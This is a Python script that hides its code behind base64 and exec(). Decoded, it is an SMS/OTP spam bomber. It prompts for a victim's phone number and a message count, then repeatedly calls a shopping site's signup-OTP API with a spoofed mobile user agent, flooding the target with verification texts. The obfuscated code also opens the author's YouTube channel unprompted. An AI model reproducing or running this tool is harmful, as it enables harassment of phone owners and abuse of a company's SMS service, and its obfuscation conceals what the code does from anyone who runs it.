#Encrypted with Crypton
#Created by OVERDOSIS
import base64
exec(base64.b64decode("aW1wb3J0IGpzb24KaW1wb3J0IHJlcXVlc3RzCmltcG9ydCBvcwppbXBvcnQgc3lzCmltcG9ydCB0aW1lCgpwcmludCgiU3Vic2NyaWJlIENoYW5lbCBHdWEgIikKb3Muc3lzdGVtKCJ4ZGctb3BlbiAgaHR0cHM6Ly95b3V0dWJlLmNvbS9jaGFubmVsL1VDQzBCNzl6enluZlpvVGRrdU5XaVJGdyIpCgpkZWYgbWFpbigpOgoJb3Muc3lzdGVtKCdjbGVhcicpCgliYW5uZXI9JycnCl9fX+KWhOKWgOKWgOKWgOKWhOKWhOKWhOKWhOKWhOKWhOKWhOKWgOKWgOKWgOKWhF8K4pSA4pSA4pSA4paI4paS4paS4paR4paR4paR4paR4paR4paR4paR4paR4paR4paS4paS4paI4pSA4pSA4pSACuKUgOKUgOKUgOKUgOKWiOKWkeKWkeKWiOKWkeKWkeKWkeKWkeKWkeKWiOKWkeKWkeKWiOKUgOKUgOKUgOKUgArilIDiloTiloTilIDilIDilojilpHilpHilpHiloDilojiloDilpHilpHilpHilojilIDilIDiloTiloTilIAK4paI4paR4paR4paI4pSA4paA4paE4paR4paR4paR4paR4paR4paR4paR4paE4paA4pSA4paI4paR4paR4paICuKWiOKWgOKWgOKWgOKWgOKWgOKWgOKWgOKWgOKWgOKWgOKWgOKWgOKWgOKWgOKWgOKWgOKWgOKWgOKWgOKWgOKWiArilogtLS0t4pWm4pSA4pWm4pWU4pWX4pWm4pSA4pWU4pWX4pWU4pWX4pWU4pWm4pWX4pWU4pWXLS0tLeKWiArilogtLS0t4pWR4pWR4pWR4pWg4pSA4pWR4pSA4pWR4pSA4pWR4pWR4pWR4pWR4pWR4pWg4pSALS0tLeKWiArilogtLS0t4pWa4pWp4pWd4pWa4pWd4pWa4pWd4pWa4pWd4pWa4pWd4pWp4pSA4pWp4pWa4pWdLS0tLeKWiArilojiloTiloTiloTiloTiloTiloTiloTiloTiloTiloTiloTiloTiloTiloTiloTiloTiloTiloTiloTiloTilogKCgoJWytdUEVNQlVBVCA6IFwwMzNbMzFtTVIuNzcKCcOXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5cKCVwwMzNbMDBtWytdZmFjZWJvb2s6IHByaXZhc2kKCcOXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5cKCVshXWd1bmFrYW4gZGVuZ2FuIGJpamFrICEhCgnDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXCglbIV1DT05UT0ggTk9NT1IgOiAwOF9fX19fX19fX18KCScnJwoJcHJpbnQoYmFubmVyKQoJbm8gPSBpbnB1dCgnIFwwMzNbMDBtdGFyZ2V0IDogJykKCWp1bSA9IGlucHV0KCdKdW1sYWggc3BhbSA6ICcpCgoKCWhlYWQgPSB7CgkiVXNlci1BZ2VudCI6ICJNb3ppbGxhLzUuMCAoTGludXg7IEFuZHJvaWQgMTA7IFNNLUExMDdGKSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvODMuMC40MTAzLjEwMSBNb2JpbGUgU2FmYXJpLzUzNy4zNiIsCgkiUmVmZXJlciI6ICJodHRwczovL3d3dy5tYXBjbHViLmNvbS9lbi91c2VyL3NpZ251cCIsCgkiSG9zdCI6ICJjbXNhcGkubWFwY2x1Yi5jb20iLAoJfQoKCglkYXQgPSB7CgkncGhvbmUnOiBubwoJfQoKCWZvciB4IGluIHJhbmdlIChpbnQoanVtKSk6CgkJbGVvc3VyZW8gPSByZXF1ZXN0cy5wb3N0KCJodHRwczovL2Ntc2FwaS5tYXBjbHViLmNvbS9hcGkvc2lnbnVwLW90cCIsIGhlYWRlcnM9aGVhZCwganNvbj1kYXQpCgkJaWYgJ2Vyb3InIGluIGxlb3N1cmVvOgoJCQlwcmludCgnZ2FnYWwgTWVuZ2lyaW0gJyArIG5vKQoKCQllbHNlOgoJCQlwcmludCgnc3VjY2VzIG1lbmdpcmltICcgKyBubykKCgoKbWFpbigpCg=="))